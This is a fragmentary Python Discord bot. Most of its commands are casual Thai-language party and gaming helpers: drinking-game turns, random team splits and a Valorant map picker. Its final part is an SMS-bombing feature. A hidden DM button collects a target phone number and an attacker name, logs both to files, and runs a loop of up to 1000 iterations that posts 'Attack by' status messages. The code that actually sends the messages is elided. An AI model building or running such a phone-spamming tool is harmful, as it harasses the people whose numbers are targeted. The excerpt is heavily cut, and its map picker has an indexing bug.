...
@bot.command(
    name ="about_me",
    description="show_infomations",
    scope=377843352944640001,
...
@bot.command(
    name ="help",
    scope=377843352944640001,
    description='Type "/help" to see bot commands',

)
async def help(ctx: interactions.CommandContext):
    await ctx.send("  -+-+-+-*^ dai commands ^*-+-+-+-\n\n||/dai||   \n||/teamup_random||      \n||/dew_happit||      \n||/dai_info||      \n||/xxx_info||      \n||/xxx_info||        \n||/xxx_info||   \n")

@bot.command(
    name ="tell_the_time",
    description = "เกมวงเหล้า",
    scope=377843352944640001,
    options=[
        interactions.Option(
            type=interactions.OptionType.STRING,
            name="next",
            description = "ใส่ชื่อคนถัดไป",
            required=True,
        ),
    ],
)
async def dew_habbit(ctx: interactions.CommandContext,next: str):
    ran = random.randint(0,3)
    lucky = " แก้วเน้ออ้าย"
    if ran == 0:
        lucky = " แก้ว... โจคดีน้อคิง"
    await ctx.send(next+"ยก "+str(ran)+lucky)
    
    
@bot.command(
    name ="teamup_5vs5",
    description = "แบ่งทีม 5 - 5 พิมพ์ end เพื่อหยุด",
    scope=377843352944640001,
    options=[
        interactions.Option(
            type=interactions.OptionType.STRING,
            name="name",
            description = "ชื่อมึงอ่ะไอเวร",
            required=True,
        ),
    ],
)
async def teamup_5vs5(ctx: interactions.CommandContext,name: str):
    ...
    if cnt == 10:
        cnt = 0
        team_1 = team1[0]+" , "+team1[1]+" , "+team1[2]+" , "+team1[3]+" , "+team1[4]
        team_2 = team2[0]+" , "+team2[1]+" , "+team2[2]+" , "+team2[3]+" , "+team2[4]
        team1.clear()
        team2.clear()
        await ctx.send("TEAM 1 :  "+team_1+"\nTEAM 2 :  "+team_2)
    else:
        await ctx.send("เพิ่ม  "+name+"  "+str(cnt)+"/10")
...
async def teamup_3vs3(ctx: interactions.CommandContext,name: str):
    ran = random.randint(1,2)
    global cnt
    cnt+=1
    if len(team1_sub)>=3:
    ...
    if ran == 1:
        if len(team1_sub)<3:
            team1_sub.append(name)
    elif ran ==2:
        if len(team2_sub)<3:    
            team2_sub.append(name)


    if cnt == 6:
        cnt = 0
        team_1 = team1_sub[0]+" , "+team1_sub[1]+" , "+team1_sub[2]
        team_2 = team2_sub[0]+" , "+team2_sub[1]+" , "+team2_sub[2]
        team1_sub.clear()
        team2_sub.clear()
        await ctx.send("TEAM1  :  "+team_1+"\nTEAM2 :  "+team_2)
    else:
        await ctx.send("เพิ่ม  "+name+"  "+str(cnt)+"/6")


@bot.command(
    name ="map_valo",
    description = "สุ่มด่าน Valorant",
    scope=377843352944640001,
)
async def val_map(ctx: interactions.CommandContext):
    map_valo = ["Ascent","Icebox","Bind","Breach","Pearl","Split","Heaven","Fracture"] 
    ran = random.randint(1,8)

    await ctx.send("สุ่มได้แมพ "+map_valo[ran])
...
async def on_message_create(message: Message):
        ...
        if channel.type == ChannelType.DM:
            if message.content == "/dai":
                start_spam = Button(
                    style=ButtonStyle.SUCCESS,
                    custom_id="start_sms",
                    label="DAIWHOMISTHEMOSTHANDSOMEINTHEWORLD",
                )
        ...
        #     phone = auth_phone.readline()
        #     agin_phone = phone
        #     embed_phone = interactions.Embed(title="**BU Script Kiddies")
        #     embed_phone.set_footer(text="BU Script Kiddies")
...
async def start_sms(ctx: interactions.ComponentContext):
    modal = Modal(
        custom_id="sms",
        title="coding by d03x",
        components=[
            TextInput(
                style=TextStyleType.SHORT,
                custom_id="text-input-1",
                label=f"เบอร์เป้าหมาย",
...
async def sms(ctx: CommandContext, one,two):
    ...
    save_phone = open("pn.txt", "a")
    save_phone.write(one+"\n")
    save_phone.close()
    save_num = open("attacker.txt", "a")
    save_num.write(two+"\n")
    save_num.close()
    await ctx.message.delete()
    embed_start = interactions.Embed(title="Attack by "+two)
    embed_start.set_footer(text="")
    ...
    while i < 1000:
        ...
        if data_stop == True:
            ...
            embed_status = interactions.Embed(title="Attack by "+two)
            embed_status.set_footer(text="")
            embed_status.add_field(name="> *เป้าหมาย*", value=f"```fix\n{phone}\n```", inline=True)
